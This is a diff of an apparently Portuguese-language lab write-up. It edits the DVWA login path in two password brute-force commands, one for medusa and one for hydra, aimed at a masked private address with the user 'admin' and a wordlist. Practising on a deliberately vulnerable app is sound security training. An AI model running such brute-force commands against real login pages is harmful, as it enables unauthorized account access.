@@ -72,7 +72,7 @@ medusa -h 192.16x.xx.xxx \
 -u admin \
 -P wordlist.txt \
 -M http \
--m FORM:"/projetos-pessoais/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+-m FORM:"/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
 ```
 
 ### ⚠️ Observação
@@ -85,7 +85,7 @@ O Medusa apresentou limitações ao lidar com formulários HTTP baseados em sess
 
 ```bash
 hydra -l admin -P wordlist.txt 192.16x.xx.xxx http-post-form \
-"/projetos-pessoais/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+"/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
 ```
 
 ---
